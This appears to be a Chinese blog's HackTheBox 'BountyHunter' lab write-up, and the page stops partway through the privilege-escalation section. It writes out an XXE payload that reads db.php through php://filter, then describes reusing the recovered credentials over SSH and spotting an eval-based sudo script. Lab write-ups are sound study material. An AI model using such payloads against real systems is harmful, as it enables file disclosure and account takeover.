@@ -1,0 +1,1377 @@
+
+
+<!DOCTYPE html>
+<html lang="zh-CN" data-default-color-scheme=auto>
+
+
+
+<head>
+  <meta charset="UTF-8">
+  <link rel="apple-touch-icon" sizes="76x76" href="https://picbedddd.oss-cn-beijing.aliyuncs.com/blog/icon/apple-touch-icon.png">
+  <link rel="icon" href="https://picbedddd.oss-cn-beijing.aliyuncs.com/blog/icon/favicon.ico">
+  <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=5.0, shrink-to-fit=no">
+  <meta http-equiv="x-ua-compatible" content="ie=edge">
+  
+  <meta name="theme-color" content="#2f4154">
+  <meta name="author" content="何语灵">
+  <meta name="keywords" content="">
+  
+    <meta name="description" content="每周练手">
+<meta property="og:type" content="article">
+<meta property="og:title" content="HackTheBox - BountyHunter">
+<meta property="og:url" content="https://m0ck1ng-b1rd.github.io/2021/12/07/HTB/BountyHunter/index.html">
+<meta property="og:site_name" content="M0cK1nG-b1Rd&#39;s site">
+<meta property="og:description" content="每周练手">
+<meta property="og:locale" content="zh_CN">
+<meta property="og:image" content="https://picbedddd.oss-cn-beijing.aliyuncs.com/blog/images_modified/a24c032885e56a17a6c74cc58b63e8f4.png">
+<meta property="article:published_time" content="2021-12-07T05:01:01.000Z">
+<meta property="article:modified_time" content="2022-04-14T11:29:30.901Z">
+<meta property="article:author" content="何语灵">
+<meta property="article:tag" content="HackTheBox">
+<meta name="twitter:card" content="summary_large_image">
+<meta name="twitter:image" content="https://picbedddd.oss-cn-beijing.aliyuncs.com/blog/images_modified/a24c032885e56a17a6c74cc58b63e8f4.png">
+  
+  
+  
+  <title>HackTheBox - BountyHunter - M0cK1nG-b1Rd&#39;s site</title>
+
+  <link  rel="stylesheet" href="https://lib.baomitu.com/twitter-bootstrap/4.6.1/css/bootstrap.min.css" />
+
+
+
+  <link  rel="stylesheet" href="https://lib.baomitu.com/github-markdown-css/4.0.0/github-markdown.min.css" />
+
+  <link  rel="stylesheet" href="https://lib.baomitu.com/hint.css/2.7.0/hint.min.css" />
+
+  <link  rel="stylesheet" href="https://lib.baomitu.com/fancybox/3.5.7/jquery.fancybox.min.css" />
+
+
+
+<!-- 主题依赖的图标库，不要自行修改 -->
+<!-- Do not modify the link that theme dependent icons -->
+
+<link rel="stylesheet" href="//at.alicdn.com/t/font_1749284_hj8rtnfg7um.css">
+
+
+
+<link rel="stylesheet" href="//at.alicdn.com/t/font_1736178_lbnruvf0jn.css">
+
+
+<link  rel="stylesheet" href="/css/main.css" />
+
+
+  <link id="highlight-css" rel="stylesheet" href="/css/highlight.css" />
+  
+    <link id="highlight-css-dark" rel="stylesheet" href="/css/highlight-dark.css" />
+  
+
+
+
+  
+<link rel="stylesheet" href="//cdn.jsdelivr.net/gh/EmoryHuang/BlogBeautify@1.1/scroll.css">
+
+
+
+  <script id="fluid-configs">
+    var Fluid = window.Fluid || {};
+    Fluid.ctx = Object.assign({}, Fluid.ctx)
+    var CONFIG = {"hostname":"m0ck1ng-b1rd.github.io","root":"/","version":"1.9.0","typing":{"enable":true,"typeSpeed":70,"cursorChar":"_","loop":false,"scope":[]},"anchorjs":{"enable":true,"element":"h1,h2,h3,h4,h5,h6","placement":"left","visible":"hover","icon":""},"progressbar":{"enable":true,"height_px":3,"color":"#29d","options":{"showSpinner":false,"trickleSpeed":100}},"code_language":{"enable":true,"default":"TEXT"},"copy_btn":true,"image_caption":{"enable":true},"image_zoom":{"enable":true,"img_url_replace":["",""]},"toc":{"enable":true,"placement":"right","headingSelector":"h1,h2,h3,h4,h5,h6","collapseDepth":0},"lazyload":{"enable":true,"loading_img":"https://picbedddd.oss-cn-beijing.aliyuncs.com/blog/loading.gif","onlypost":false,"offset_factor":2},"web_analytics":{"enable":true,"baidu":null,"google":null,"gtag":null,"tencent":{"sid":null,"cid":null},"woyaola":null,"cnzz":null,"leancloud":{"app_id":"87rdYWc7BpvmNHtufVgH6hwF-gzGzoHsz","app_key":"FOGIb6hlzKdTWSp4wBpACnWG","server_url":null,"path":"window.location.pathname","ignore_local":false}},"search_path":"/local-search.xml"};
+
+    if (CONFIG.web_analytics.follow_dnt) {
+      var dntVal = navigator.doNotTrack || window.doNotTrack || navigator.msDoNotTrack;
+      Fluid.ctx.dnt = dntVal && (dntVal.startsWith('1') || dntVal.startsWith('yes') || dntVal.startsWith('on'));
+    }
+  </script>
+  <script  src="/js/utils.js" ></script>
+  <script  src="/js/color-schema.js" ></script>
+
+  
+<meta name="generator" content="Hexo 6.1.0"></head>
+
+
+<body>
+  
+
+  <header>
+    
+
+<div class="header-inner" style="height: 70vh;">
+  <nav id="navbar" class="navbar fixed-top  navbar-expand-lg navbar-dark scrolling-navbar">
+  <div class="container">
+    <a class="navbar-brand" href="/">
+      <strong>M0cK1nG-b1Rd&#39;s site</strong>
+    </a>
+
+    <button id="navbar-toggler-btn" class="navbar-toggler" type="button" data-toggle="collapse"
+            data-target="#navbarSupportedContent"
+            aria-controls="navbarSupportedContent" aria-expanded="false" aria-label="Toggle navigation">
+      <div class="animated-icon"><span></span><span></span><span></span></div>
+    </button>
+
+    <!-- Collapsible content -->
+    <div class="collapse navbar-collapse" id="navbarSupportedContent">
+      <ul class="navbar-nav ml-auto text-center">
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/">
+                <i class="iconfont icon-home-fill"></i>
+                首页
+              </a>
+            </li>
+          
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/archives/">
+                <i class="iconfont icon-archive-fill"></i>
+                归档
+              </a>
+            </li>
+          
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/categories/">
+                <i class="iconfont icon-category-fill"></i>
+                分类
+              </a>
+            </li>
+          
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/tags/">
+                <i class="iconfont icon-tags-fill"></i>
+                标签
+              </a>
+            </li>
+          
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/about/">
+                <i class="iconfont icon-user-fill"></i>
+                关于
+              </a>
+            </li>
+          
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/links/">
+                <i class="iconfont icon-link-fill"></i>
+                友链
+              </a>
+            </li>
+          
+        
+        
+          <li class="nav-item" id="search-btn">
+            <a class="nav-link" target="_self" href="javascript:;" data-toggle="modal" data-target="#modalSearch" aria-label="Search">
+              &nbsp;<i class="iconfont icon-search"></i>&nbsp;
+            </a>
+          </li>
+          
+        
+        
+          <li class="nav-item" id="color-toggle-btn">
+            <a class="nav-link" target="_self" href="javascript:;" aria-label="Color Toggle">&nbsp;<i
+                class="iconfont icon-dark" id="color-toggle-icon"></i>&nbsp;</a>
+          </li>
+        
+      </ul>
+    </div>
+  </div>
+</nav>
+
+  
+
+<div id="banner" class="banner" parallax=true
+     style="background: url('https://picbedddd.oss-cn-beijing.aliyuncs.com/blog/761607.png') no-repeat center center; background-size: cover;">
+  <div class="full-bg-img">
+    <div class="mask flex-center" style="background-color: rgba(0, 0, 0, 0.3)">
+      <div class="banner-text text-center fade-in-up">
+        <div class="h2">
+          
+            <span id="subtitle" data-typed-text="HackTheBox - BountyHunter"></span>
+          
+        </div>
+
+        
+          
+  <div class="mt-3">
+    
+    
+      <span class="post-meta">
+        <i class="iconfont icon-date-fill" aria-hidden="true"></i>
+        <time datetime="2021-12-07 13:01" pubdate>
+          2021年12月7日 下午
+        </time>
+      </span>
+    
+  </div>
+
+  <div class="mt-1">
+    
+      <span class="post-meta mr-2">
+        <i class="iconfont icon-chart"></i>
+        
+          1.8k 字
+        
+      </span>
+    
+
+    
+      <span class="post-meta mr-2">
+        <i class="iconfont icon-clock-fill"></i>
+        
+        
+        
+          16 分钟
+        
+      </span>
+    
+
+    
+    
+  </div>
+
+
+        
+      </div>
+
+      
+    </div>
+  </div>
+</div>
+
+</div>
+
+  </header>
+
+  <main>
+    
+      
+
+<div class="container-fluid nopadding-x">
+  <div class="row nomargin-x">
+    <div class="side-col d-none d-lg-block col-lg-2">
+      
+  <aside class="sidebar category-bar" style="margin-right: -1rem">
+    
+
+
+
+
+
+<div class="category-list">
+  
+  
+    
+    
+    
+    <div class="category row nomargin-x">
+      <a class="category-item 
+          list-group-item category-item-action col-10 col-md-11 col-xm-11" title="Web"
+        id="heading-c6e190b284633c48e39e55049da3cce8" role="tab" data-toggle="collapse" href="#collapse-c6e190b284633c48e39e55049da3cce8"
+        aria-expanded="true"
+      >
+        Web
+        <span class="list-group-count">(29)</span>
+        <i class="iconfont icon-arrowright"></i>
+      </a>
+      
+      <div class="category-collapse collapse show" id="collapse-c6e190b284633c48e39e55049da3cce8"
+           role="tabpanel" aria-labelledby="heading-c6e190b284633c48e39e55049da3cce8">
+        
+        
+          
+          
+  <div class="category-post-list">
+    
+    
+  </div>
+
+          
+  
+    
+    
+    
+    <div class="category-sub row nomargin-x">
+      <a class="category-subitem collapsed
+          list-group-item category-item-action col-10 col-md-11 col-xm-11" title="CTF"
+        id="heading-59db9139e685f7d6a4a8784f9221066f" role="tab" data-toggle="collapse" href="#collapse-59db9139e685f7d6a4a8784f9221066f"
+        aria-expanded="false"
+      >
+        CTF
+        <span class="list-group-count">(2)</span>
+        <i class="iconfont icon-arrowright"></i>
+      </a>
+      
+      <div class="category-collapse collapse " id="collapse-59db9139e685f7d6a4a8784f9221066f"
+           role="tabpanel" aria-labelledby="heading-59db9139e685f7d6a4a8784f9221066f">
+        
+        
+          
+  <div class="category-post-list">
+    
+    
+      
+      
+        <a href="/2020/08/02/writeup/BUUCTF%20RE%20crackMe%20WP%20%E8%AF%A6%E7%BB%86%E8%A7%A3%E6%9E%90/" title="BUUCTF RE crackMe WP 详细解析"
+           class="list-group-item list-group-item-action
+           ">
+          <span class="category-post">BUUCTF RE crackMe WP 详细解析</span>
+        </a>
+      
+    
+      
+      
+        <a href="/2020/08/01/writeup/CISCN%202020%20%E7%BA%BF%E4%B8%8A%E5%88%9D%E8%B5%9B%20%E7%94%B5%E8%84%91%E8%A2%AB%E9%BB%91%20WP/" title="CISCN 2020 线上初赛 电脑被黑 WP"
+           class="list-group-item list-group-item-action
+           ">
+          <span class="category-post">CISCN 2020 线上初赛 电脑被黑 WP</span>
+        </a>
+      
+    
+  </div>
+
+        
+      </div>
+    </div>
+  
+    
+    
+    
+    <div class="category-sub row nomargin-x">
+      <a class="category-subitem collapsed
+          list-group-item category-item-action col-10 col-md-11 col-xm-11" title="Tools"
+        id="heading-8625e1de7be14c39b1d14dc03d822497" role="tab" data-toggle="collapse" href="#collapse-8625e1de7be14c39b1d14dc03d822497"
+        aria-expanded="false"
+      >
+        Tools
+        <span class="list-group-count">(1)</span>
+        <i class="iconfont icon-arrowright"></i>
+      </a>
+      
+      <div class="category-collapse collapse " id="collapse-8625e1de7be14c39b1d14dc03d822497"
+           role="tabpanel" aria-labelledby="heading-8625e1de7be14c39b1d14dc03d822497">
+        
+        
+          
+          
+  <div class="category-post-list">
+    
+    
+  </div>
+
+          
+  
+    
+    
+    
+    <div class="category-sub row nomargin-x">
+      <a class="category-subitem collapsed
+          list-group-item category-item-action col-10 col-md-11 col-xm-11" title="CS"
+        id="heading-8d7e99c73cd5a10adaaf4c9f9a520368" role="tab" data-toggle="collapse" href="#collapse-8d7e99c73cd5a10adaaf4c9f9a520368"
+        aria-expanded="false"
+      >
+        CS
+        <span class="list-group-count">(1)</span>
+        <i class="iconfont icon-arrowright"></i>
+      </a>
+      
+      <div class="category-collapse collapse " id="collapse-8d7e99c73cd5a10adaaf4c9f9a520368"
+           role="tabpanel" aria-labelledby="heading-8d7e99c73cd5a10adaaf4c9f9a520368">
+        
+        
+          
+  <div class="category-post-list">
+    
+    
+      
+      
+        <a href="/2022/04/13/APT%E7%BA%A7CS%E9%9A%90%E8%97%8F%E6%95%99%E7%A8%8B%EF%BC%9A%E4%BD%BF%E7%94%A8%E5%8F%8D%E5%90%91%E4%BB%A3%E7%90%86%E3%80%81C2-Profile%E5%92%8CCDN%E6%8B%89%E6%BB%A1%E6%BA%AF%E6%BA%90%E9%9A%BE%E5%BA%A6/" title="APT级CS隐藏教程：使用反向代理、C2-Profile和CDN拉满溯源难度"
+           class="list-group-item list-group-item-action
+           ">
+          <span class="category-post">APT级CS隐藏教程：使用反向代理、C2-Profile和CDN拉满溯源难度</span>
+        </a>
+      
+    
+  </div>
+
+        
+      </div>
+    </div>
+  
+        
+      </div>
+    </div>
+  
+    
+    
+    
+    <div class="category-sub row nomargin-x">
+      <a class="category-subitem collapsed
+          list-group-item category-item-action col-10 col-md-11 col-xm-11" title="实战总结"
+        id="heading-b72ec7666e8b6b8032fa97fc10aa2f34" role="tab" data-toggle="collapse" href="#collapse-b72ec7666e8b6b8032fa97fc10aa2f34"
+        aria-expanded="false"
+      >
+        实战总结
+        <span class="list-group-count">(2)</span>
+        <i class="iconfont icon-arrowright"></i>
+      </a>
+      
+      <div class="category-collapse collapse " id="collapse-b72ec7666e8b6b8032fa97fc10aa2f34"
+           role="tabpanel" aria-labelledby="heading-b72ec7666e8b6b8032fa97fc10aa2f34">
+        
+        
+          
+  <div class="category-post-list">
+    
+    
+      
+      
+        <a href="/2020/08/03/writeup/DDCTF%202020%20Web%20WP/" title="DDCTF 2020 Web WP"
+           class="list-group-item list-group-item-action
+           ">
+          <span class="category-post">DDCTF 2020 Web WP</span>
+        </a>
+      
+    
+      
+      
+        <a href="/2022/02/01/%E5%86%85%E7%BD%91%E6%8F%90%E6%9D%83-Linux/" title="Linux提权一文通"
+           class="list-group-item list-group-item-action
+           ">
+          <span class="category-post">Linux提权一文通</span>
+        </a>
+      
+    
+  </div>
+
+        
+      </div>
+    </div>
+  
+    
+    
+    
+    <div class="category-sub row nomargin-x">
+      <a class="category-subitem collapsed
+          list-group-item category-item-action col-10 col-md-11 col-xm-11" title="实战记录"
+        id="heading-39a7745802909bb372c3d2a5253e0e72" role="tab" data-toggle="collapse" href="#collapse-39a7745802909bb372c3d2a5253e0e72"
+        aria-expanded="false"
+      >
+        实战记录
+        <span class="list-group-count">(3)</span>
+        <i class="iconfont icon-arrowright"></i>
+      </a>
+      
+      <div class="category-collapse collapse " id="collapse-39a7745802909bb372c3d2a5253e0e72"
+           role="tabpanel" aria-labelledby="heading-39a7745802909bb372c3d2a5253e0e72">
+        
+        
+          
+  <div class="category-post-list">
+    
+    
+      
+      
+        <a href="/2021/10/07/%E5%AE%9E%E6%88%98/%E6%9F%90%E5%A4%A7%E5%AD%A6%E5%85%B3%E9%94%AE%E7%B3%BB%E7%BB%9Fshell%E8%BF%87%E7%A8%8B%E8%AE%B0%E5%BD%95/" title="某大学关键系统shell过程记录"
+           class="list-group-item list-group-item-action
+           ">
+          <span class="category-post">某大学关键系统shell过程记录</span>
+        </a>
+      
+    
+      
+      
+        <a href="/2020/08/04/%E5%AE%9E%E6%88%98/%E6%9F%90%E5%A4%A7%E5%AD%A6%E6%96%B0%E7%89%88%E5%AD%A6%E5%B7%A5%E7%B3%BB%E7%BB%9FSQL%E6%B3%A8%E5%85%A5%E4%B8%8EWAF%E7%BB%95%E8%BF%87/" title="某大学新版学工系统SQL注入与WAF绕过"
+           class="list-group-item list-group-item-action
+           ">
+          <span class="category-post">某大学新版学工系统SQL注入与WAF绕过</span>
+        </a>
+      
+    
+      
+      
+        <a href="/2021/10/07/%E5%AE%9E%E6%88%98/%E6%9F%90%E6%A0%A1%E5%8C%BA%E5%A4%A7%E8%8C%83%E5%9B%B4%E4%BA%A4%E6%8D%A2%E6%9C%BA%E5%BC%B1%E5%8F%A3%E4%BB%A4%E8%B0%83%E6%9F%A5%E8%AE%B0%E5%BD%95/" title="某校区大范围交换机弱口令调查记录"
+           class="list-group-item list-group-item-action
+           ">
+          <span class="category-post">某校区大范围交换机弱口令调查记录</span>
+        </a>
+      
+    
+  </div>
+
+        
+      </div>
+    </div>
+  
+    
+    
+    
+    <div class="category-sub row nomargin-x">
+      <a class="category-subitem 
+          list-group-item category-item-action col-10 col-md-11 col-xm-11" title="靶场"
+        id="heading-bbb1a20d773b8c57f5cf8f45cfbb1835" role="tab" data-toggle="collapse" href="#collapse-bbb1a20d773b8c57f5cf8f45cfbb1835"
+        aria-expanded="true"
+      >
+        靶场
+        <span class="list-group-count">(21)</span>
+        <i class="iconfont icon-arrowright"></i>
+      </a>
+      
+      <div class="category-collapse collapse show" id="collapse-bbb1a20d773b8c57f5cf8f45cfbb1835"
+           role="tabpanel" aria-labelledby="heading-bbb1a20d773b8c57f5cf8f45cfbb1835">
+        
+        
+          
+          
+  <div class="category-post-list">
+    
+    
+  </div>
+
+          
+  
+    
+    
+    
+    <div class="category-sub row nomargin-x">
+      <a class="category-subitem 
+          list-group-item category-item-action col-10 col-md-11 col-xm-11" title="HackTheBox"
+        id="heading-d9fb08be3ed131369df5d4aa808dac70" role="tab" data-toggle="collapse" href="#collapse-d9fb08be3ed131369df5d4aa808dac70"
+        aria-expanded="true"
+      >
+        HackTheBox
+        <span class="list-group-count">(16)</span>
+        <i class="iconfont icon-arrowright"></i>
+      </a>
+      
+      <div class="category-collapse collapse show" id="collapse-d9fb08be3ed131369df5d4aa808dac70"
+           role="tabpanel" aria-labelledby="heading-d9fb08be3ed131369df5d4aa808dac70">
+        
+        
+          
+  <div class="category-post-list">
+    
+    
+      
+      
+        <a href="/2021/12/07/HTB/BountyHunter/" title="HackTheBox - BountyHunter"
+           class="list-group-item list-group-item-action
+           active">
+          <span class="category-post">HackTheBox - BountyHunter</span>
+        </a>
+      
+    
+      
+      
+        <a href="/2021/12/07/HTB/Cap/" title="HackTheBox - Cap"
+           class="list-group-item list-group-item-action
+           ">
+          <span class="category-post">HackTheBox - Cap</span>
+        </a>
+      
+    
+      
+      
+        <a href="/2021/12/07/HTB/Driver/" title="HackTheBox - Driver"
+           class="list-group-item list-group-item-action
+           ">
+          <span class="category-post">HackTheBox - Driver</span>
+        </a>
+      
+    
+      
+      
+        <a href="/2021/12/07/HTB/Horizontall/" title="HackTheBox - Horizontall"
+           class="list-group-item list-group-item-action
+           ">
+          <span class="category-post">HackTheBox - Horizontall</span>
+        </a>
+      
+    
+      
+      
+        <a href="/2021/12/07/HTB/Intelligence/" title="HackTheBox - Intelligence"
+           class="list-group-item list-group-item-action
+           ">
+          <span class="category-post">HackTheBox - Intelligence</span>
+        </a>
+      
+    
+      
+      
+        <a href="/2021/12/07/HTB/Monitors/" title="HackTheBox - Monitors"
+           class="list-group-item list-group-item-action
+           ">
+          <span class="category-post">HackTheBox - Monitors</span>
+        </a>
+      
+    
+      
+      
+        <a href="/2021/12/07/HTB/Previse/" title="HackTheBox - Previse"
+           class="list-group-item list-group-item-action
+           ">
+          <span class="category-post">HackTheBox - Previse</span>
+        </a>
+      
+    
+      
+      
+        <a href="/2021/12/07/HTB/Schooled/" title="HackTheBox - Schooled"
+           class="list-group-item list-group-item-action
+           ">
+          <span class="category-post">HackTheBox - Schooled</span>
+        </a>
+      
+    
+      
+      
+        <a href="/2021/12/13/HTB/Seal/" title="HackTheBox - Seal"
+           class="list-group-item list-group-item-action
+           ">
+          <span class="category-post">HackTheBox - Seal</span>
+        </a>
+      
+    
+      
+      
+        <a href="/2022/04/13/HTB/Shibboleth/" title="HackTheBox - Shibboleth"
+           class="list-group-item list-group-item-action
+           ">
+          <span class="category-post">HackTheBox - Shibboleth</span>
+        </a>
+      
+    
+      
+      
+        <a href="/2021/12/07/HTB/Sink/" title="HackTheBox - Sink"
+           class="list-group-item list-group-item-action
+           ">
+          <span class="category-post">HackTheBox - Sink</span>
+        </a>
+      
+    
+      
+      
+        <a href="/2021/12/07/HTB/Spider/" title="HackTheBox - Spider"
+           class="list-group-item list-group-item-action
+           ">
+          <span class="category-post">HackTheBox - Spider</span>
+        </a>
+      
+    
+      
+      
+        <a href="/2021/12/07/HTB/StartingPoint-Archetype/" title="HackTheBox - StartingPoint-Archetype"
+           class="list-group-item list-group-item-action
+           ">
+          <span class="category-post">HackTheBox - StartingPoint-Archetype</span>
+        </a>
+      
+    
+      
+      
+        <a href="/2021/12/07/HTB/StartingPoint-Pathfinder/" title="HackTheBox - StartingPoint-Pathfinder"
+           class="list-group-item list-group-item-action
+           ">
+          <span class="category-post">HackTheBox - StartingPoint-Pathfinder</span>
+        </a>
+      
+    
+      
+      
+        <a href="/2022/05/19/HTB/Unicode/" title="HackTheBox - StartingPoint-Pathfinder"
+           class="list-group-item list-group-item-action
+           ">
+          <span class="category-post">HackTheBox - StartingPoint-Pathfinder</span>
+        </a>
+      
+    
+      
+      
+        <a href="/2021/12/07/HTB/dynstr/" title="HackTheBox - dynstr"
+           class="list-group-item list-group-item-action
+           ">
+          <span class="category-post">HackTheBox - dynstr</span>
+        </a>
+      
+    
+  </div>
+
+        
+      </div>
+    </div>
+  
+    
+    
+    
+    <div class="category-sub row nomargin-x">
+      <a class="category-subitem collapsed
+          list-group-item category-item-action col-10 col-md-11 col-xm-11" title="vulstack"
+        id="heading-3b33beeac26d5932bd6827f54cbd9129" role="tab" data-toggle="collapse" href="#collapse-3b33beeac26d5932bd6827f54cbd9129"
+        aria-expanded="false"
+      >
+        vulstack
+        <span class="list-group-count">(5)</span>
+        <i class="iconfont icon-arrowright"></i>
+      </a>
+      
+      <div class="category-collapse collapse " id="collapse-3b33beeac26d5932bd6827f54cbd9129"
+           role="tabpanel" aria-labelledby="heading-3b33beeac26d5932bd6827f54cbd9129">
+        
+        
+          
+  <div class="category-post-list">
+    
+    
+      
+      
+        <a href="/2021/12/07/vulstack/%E7%BA%A2%E9%98%9F%E8%AF%84%E4%BC%B0%E4%B8%80/" title="红队评估一记录"
+           class="list-group-item list-group-item-action
+           ">
+          <span class="category-post">红队评估一记录</span>
+        </a>
+      
+    
+      
+      
+        <a href="/2021/12/07/vulstack/%E7%BA%A2%E9%98%9F%E8%AF%84%E4%BC%B0%E4%B8%89/" title="红队评估三记录"
+           class="list-group-item list-group-item-action
+           ">
+          <span class="category-post">红队评估三记录</span>
+        </a>
+      
+    
+      
+      
+        <a href="/2021/12/07/vulstack/%E7%BA%A2%E9%98%9F%E8%AF%84%E4%BC%B0%E4%BA%8C/" title="红队评估二记录"
+           class="list-group-item list-group-item-action
+           ">
+          <span class="category-post">红队评估二记录</span>
+        </a>
+      
+    
+      
+      
+        <a href="/2021/12/07/vulstack/%E7%BA%A2%E9%98%9F%E8%AF%84%E4%BC%B0%E4%BA%94/" title="红队评估五记录"
+           class="list-group-item list-group-item-action
+           ">
+          <span class="category-post">红队评估五记录</span>
+        </a>
+      
+    
+      
+      
+        <a href="/2021/12/07/vulstack/%E7%BA%A2%E9%98%9F%E8%AF%84%E4%BC%B0%E5%9B%9B/" title="红队评估四记录"
+           class="list-group-item list-group-item-action
+           ">
+          <span class="category-post">红队评估四记录</span>
+        </a>
+      
+    
+  </div>
+
+        
+      </div>
+    </div>
+  
+        
+      </div>
+    </div>
+  
+        
+      </div>
+    </div>
+  
+</div>
+
+
+  </aside>
+
+
+    </div>
+
+    <div class="col-lg-8 nopadding-x-md">
+      <div class="container nopadding-x-md" id="board-ctn">
+        <div id="board">
+          <article class="post-content mx-auto">
+            <!-- SEO header -->
+            <h1 style="display: none">HackTheBox - BountyHunter</h1>
+            
+              <p class="note note-info">
+                
+                  
+                    本文最后更新于：2022年4月14日 晚上
+                  
+                
+              </p>
+            
+            <div class="markdown-body">
+              
+              <h2 id="0x01-信息收集"><a href="#0x01-信息收集" class="headerlink" title="0x01 信息收集"></a>0x01 信息收集</h2><p>端口信息</p>
+<p><img src="https://picbedddd.oss-cn-beijing.aliyuncs.com/2021/09/HackTheBox/img/BountyHunter.assets/image-20210905162026669.png" srcset="https://picbedddd.oss-cn-beijing.aliyuncs.com/blog/loading.gif" lazyload alt="image-20210905162026669"></p>
+<p>目录扫描</p>
+<p><img src="https://picbedddd.oss-cn-beijing.aliyuncs.com/2021/09/HackTheBox/img/BountyHunter.assets/image-20210905161800851.png" srcset="https://picbedddd.oss-cn-beijing.aliyuncs.com/blog/loading.gif" lazyload alt="image-20210905161800851"></p>
+<h2 id="0x02-打靶"><a href="#0x02-打靶" class="headerlink" title="0x02 打靶"></a>0x02 打靶</h2><p>一通乱点后来到一个后台地址：</p>
+<p><img src="https://picbedddd.oss-cn-beijing.aliyuncs.com/2021/09/HackTheBox/img/BountyHunter.assets/image-20210905123140302.png" srcset="https://picbedddd.oss-cn-beijing.aliyuncs.com/blog/loading.gif" lazyload alt="image-20210905123140302"></p>
+<p>提交后在burp中能够发现网站和后台通信的数据：</p>
+<p><img src="https://picbedddd.oss-cn-beijing.aliyuncs.com/2021/09/HackTheBox/img/BountyHunter.assets/image-20210905123307253.png" srcset="https://picbedddd.oss-cn-beijing.aliyuncs.com/blog/loading.gif" lazyload alt="image-20210905123307253"></p>
+<p>进行URL解码和BASE64解码后发现是xml：</p>
+<p><img src="https://picbedddd.oss-cn-beijing.aliyuncs.com/2021/09/HackTheBox/img/BountyHunter.assets/image-20210905123338095.png" srcset="https://picbedddd.oss-cn-beijing.aliyuncs.com/blog/loading.gif" lazyload alt="image-20210905123338095"></p>
+<p>于是可以试试XXE，首先读取文件：</p>
+<p><img src="https://picbedddd.oss-cn-beijing.aliyuncs.com/2021/09/HackTheBox/img/BountyHunter.assets/image-20210905123403065.png" srcset="https://picbedddd.oss-cn-beijing.aliyuncs.com/blog/loading.gif" lazyload alt="image-20210905123403065"></p>
+<p>成功了，接下来可以试试读取别的文件：</p>
+<p><img src="https://picbedddd.oss-cn-beijing.aliyuncs.com/2021/09/HackTheBox/img/BountyHunter.assets/image-20210905123428344.png" srcset="https://picbedddd.oss-cn-beijing.aliyuncs.com/blog/loading.gif" lazyload alt="image-20210905123428344"></p>
+<p>但是该读什么文件呢，在之前的扫描目录可以发现<code>db.php</code>，于是尝试读取<code>db.php</code>：</p>
+<figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><code class="hljs xml"><span class="hljs-meta">&lt;?xml version=<span class="hljs-string">&quot;1.0&quot;</span>?&gt;</span><br><span class="hljs-meta">&lt;!DOCTYPE <span class="hljs-keyword">ANY</span> [</span><br><span class="hljs-meta">    <span class="hljs-meta">&lt;!ENTITY <span class="hljs-keyword">test</span> <span class="hljs-keyword">SYSTEM</span> <span class="hljs-string">&quot;php://filter/convert.base64-encode/resource=/var/www/html/db.php&quot;</span>&gt;</span></span><br><span class="hljs-meta">    ]&gt;</span><br>    <span class="hljs-tag">&lt;<span class="hljs-name">bugreport</span>&gt;</span><br>    <span class="hljs-tag">&lt;<span class="hljs-name">title</span>&gt;</span>dfg<span class="hljs-tag">&lt;/<span class="hljs-name">title</span>&gt;</span><br>    <span class="hljs-tag">&lt;<span class="hljs-name">cwe</span>&gt;</span>dfg<span class="hljs-tag">&lt;/<span class="hljs-name">cwe</span>&gt;</span><br>    <span class="hljs-tag">&lt;<span class="hljs-name">cvss</span>&gt;</span><span class="hljs-symbol">&amp;test;</span><span class="hljs-tag">&lt;/<span class="hljs-name">cvss</span>&gt;</span><br>    <span class="hljs-tag">&lt;<span class="hljs-name">reward</span>&gt;</span>dfg<span class="hljs-tag">&lt;/<span class="hljs-name">reward</span>&gt;</span><br>    <span class="hljs-tag">&lt;/<span class="hljs-name">bugreport</span>&gt;</span><br></code></pre></td></tr></table></figure>
+
+
+
+<p>在拿到Base64字符串后拿去解码，可以拿到账户和密码：</p>
+<p><img src="https://picbedddd.oss-cn-beijing.aliyuncs.com/2021/09/HackTheBox/img/BountyHunter.assets/image-20210905124114252.png" srcset="https://picbedddd.oss-cn-beijing.aliyuncs.com/blog/loading.gif" lazyload alt="image-20210905124114252"></p>
+<p>但是之前的扫描端口发现数据库并没有开放外联，但总归是拿到了敏感信息的。然后还开放了<code>ssh</code>，我们可以试着去撞库。</p>
+<p>这里我们可以使用<code>/etc/passwd</code>中拿到的账户做字典去跑。但是用户数量比较少我就选择了一个个试，最后试出了<code>development</code>账户：</p>
+<p><img src="https://picbedddd.oss-cn-beijing.aliyuncs.com/2021/09/HackTheBox/img/BountyHunter.assets/image-20210905130216528.png" srcset="https://picbedddd.oss-cn-beijing.aliyuncs.com/blog/loading.gif" lazyload alt="image-20210905130216528"></p>
+<h2 id="0x03-提权"><a href="#0x03-提权" class="headerlink" title="0x03 提权"></a>0x03 提权</h2><p>在进行一些信息收集后，我使用命令</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">sudo -l<br></code></pre></td></tr></table></figure>
+
+<p>发现存在某个校验票据的脚本：</p>
+<p><img src="https://picbedddd.oss-cn-beijing.aliyuncs.com/2021/09/HackTheBox/img/BountyHunter.assets/image-20210905130456254.png" srcset="https://picbedddd.oss-cn-beijing.aliyuncs.com/blog/loading.gif" lazyload alt="image-20210905130456254"></p>
+<p>查看该脚本，该脚本是只读的。但是能够发现脚本使用了危险的函数<code>eval</code>：</p>
+<p><img src="https://picbedddd.oss-cn-beijing.aliyuncs.com/2021/09/HackTheBox/img/BountyHunter.assets/image-20210905131218741.png" srcset="https://picbedddd.oss-cn-beijing.aliyuncs.com/blog/loading.gif" lazyload alt="image-20210905131218741"></p>
+<p>关键函数截取如下：</p>
